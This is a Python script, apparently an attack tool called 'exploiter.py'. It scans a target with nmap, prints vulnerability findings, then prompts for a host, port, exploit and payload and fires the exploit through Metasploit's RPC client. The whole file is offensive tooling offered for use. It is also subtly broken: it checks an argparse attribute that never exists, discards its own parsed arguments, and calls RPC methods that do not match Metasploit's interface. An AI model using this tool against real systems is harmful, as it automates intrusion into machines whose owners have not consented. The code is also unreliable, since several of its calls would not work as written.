import nmap
import msfrpc
import msfrpc.client
import argparse

def print_help():
    print("Usage: python exploiter.py [options] [target]")
    print("Options:")
    print("  -h, --help\t\tPrint this help message")
    print("  -s <ports>, --scan <ports>\tPerform a port scan on the target")
    print("  -v, --vulns\t\tCheck for vulnerabilities on open ports")
    print("  -a <exploit>, --attack <exploit>\tExploit a vulnerability")
    print("  -u <username> -p <password>, --auth <username> <password>\tAuthenticate to the target")
    
parser = argparse.ArgumentParser()
parser.add_argument("-s", "--scan", help="Perform a port scan on the target")
parser.add_argument("-v", "--vulns", help="Check for vulnerabilities on open ports", action="store_true")
parser.add_argument("-a", "--attack", help="Exploit a vulnerability")
parser.add_argument("-u", "--username", help="Username for authentication")
parser.add_argument("-p", "--password", help="Password for authentication")
parser.add_argument("target", help="Target IP address or hostname")
args = parser.parse_args()

if args.help:
    print_help()
    exit()
    
def run_scan(target, options):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments=options)

    for host in nm.all_hosts():
        print('---------------------------------------------')
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        print('---------------------------------------------')

        for proto in nm[host].all_protocols():
            print('Protocol : %s' % proto)

            lport = list(nm[host][proto].keys())
            lport.sort()

            for port in lport:
                print('Port : %s\tState : %s' % (port, nm[host][proto][port]['state']))

                if 'script' in nm[host][proto][port]:
                    vulns = nm[host][proto][port]['script']

                    if type(vulns) == list:
                        for vuln in vulns:
                            print('\t%s : %s' % (vuln['id'], vuln['output']))
                    else:
                        print('\t%s : %s' % (vulns['id'], vulns['output']))

def launch_attack(host, port, exploit, payload):
    try:
        client = msfrpc.client.Msfrpc({})
        client.login('msf', 'msf')
        console_id = client.call('console.create')['id']
        client.call('console.read', [{'console_id': console_id}])
        client.call('module.load', {'type': 'exploit', 'path': exploit})
        client.call('module.exploits', {'actions': 'show', 'type': 'exploit'})
        client.call('module.use', {'module': exploit})
        client.call('module.options', {'module': exploit})
        client.call('module.targetip', {'module': exploit, 'target': host})
        client.call('module.targetport', {'module': exploit, 'target': port})
        client.call('module.payload', {'module': exploit, 'payload': payload})
        client.call('exploit.execute', {'module': exploit})
        console_output = client.call('console.read', [{'console_id': console_id}])['data']
        print(console_output)
        client.call('console.destroy', [{'console_id': console_id}])
    except msfrpc.MsfrpcException as e:
        print(e)

target = input('Enter target IP or hostname: ')
options = input('Enter Nmap options to use (default is "-sS -sV"): ') or '-sS -sV'
run_scan(target, options)

while True:
    choice = input('Do you want to launch an attack? (y/n): ')

    if choice.lower() == 'n':
        break
    elif choice.lower() == 'y':
        host = input('Enter the target IP: ')
        port = input('Enter the vulnerable port: ')
        exploit = input('Enter the Metasploit exploit to use: ')
        payload = input('Enter the Metasploit payload to use: ')
        launch_attack(host, port, exploit, payload)
    else:
        print('Invalid choice. Please enter "y" or "n".')
